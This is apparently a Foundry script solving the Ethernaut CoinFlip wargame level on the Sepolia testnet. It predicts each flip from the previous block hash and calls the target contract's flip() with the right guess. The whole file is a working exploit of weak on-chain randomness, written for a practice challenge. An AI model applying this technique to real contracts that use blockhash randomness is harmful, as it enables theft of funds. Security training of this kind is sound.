// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
// import "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract Exp is Script {
    // $ forge script script/CoinFlipExp.s.sol
    // $ forge script script/CoinFlipExp.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv
    // $ make coinFlipExp ARGS='--network sepolia'
    // $ forge script script/CoinFlipExp.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY_ANVIL --broadcast -vvvvv
    // ./scriptbash/CoinFlipExp.sh
    // 成功event
    event SuccessEvent();
    // 失败event
    event CatchEvent(string message);
    event CatchByte(bytes data);

    ICoinFlip public coinFlipInstance = ICoinFlip(0x9A4d4d6A6467D0869AD45E8220958a56421d7B2F);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        // coinFlipInstance = CoinFlip(0x9Ad4d6A6467D0869AD45E8220958a56421d7B2F);
        vm.startBroadcast();
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool success = coinFlip == 1 ? true : false;
        try coinFlipInstance.flip(success) returns (bool result) {
            if (result) {
                console2.log("Flip successful with guess:", success);
                emit SuccessEvent();
            } else {
                console2.log("Flip failed with guess:", success);
            }
        } catch Error(string memory reason) {
            emit CatchEvent(reason);
        } catch (bytes memory reason) {
            emit CatchByte(reason);
        }
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
